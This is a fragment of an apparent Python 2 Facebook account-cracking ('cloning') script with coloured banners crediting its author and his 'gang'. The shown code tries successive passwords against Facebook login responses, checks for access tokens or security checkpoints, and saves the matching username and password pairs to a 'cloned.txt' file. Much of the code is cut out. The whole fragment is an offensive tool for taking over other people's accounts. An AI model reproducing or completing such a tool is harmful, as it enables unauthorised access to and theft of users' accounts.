...
\033[1;92m.    New Version3.0　 
\033[1;97m　 Author:Bilal Khan
\033[1;92m　 Whatsapp:03129915502
...
\033[1;92m---------------------PukhTooN---------------------
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mBe Original Lets The World Copy You
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91mDEVOLPER:
                     Bilal Khan Pathan
\033[1;94mGang:
...
\033[1;92mMaker:
                      Bilal Khan
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mWe Are Kings❣️..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      

\033[1;95m-----------------Bilal Khan------------------------
"""
logo2 = """
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(Checkpoint(7days)) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(CheckPoint) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mBilal khan
